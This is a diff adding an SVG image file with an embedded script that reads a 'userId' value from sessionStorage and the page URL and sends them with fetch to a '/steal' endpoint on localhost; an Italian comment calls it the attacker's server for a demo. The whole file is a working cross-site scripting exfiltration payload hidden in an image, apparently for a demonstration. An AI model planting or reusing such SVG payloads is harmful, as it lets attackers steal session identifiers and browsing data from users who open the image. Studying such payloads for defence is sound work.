@@ -1,0 +1,9 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    var userId = sessionStorage.getItem("userId");
+    var data = "userId=" + userId + "&url=" + window.location.href;
+    
+    // Invia i dati al "server dell'attaccante" (localhost per la demo)
+    fetch("http://localhost:9999/steal?" + data);
+  </script>
+</svg>
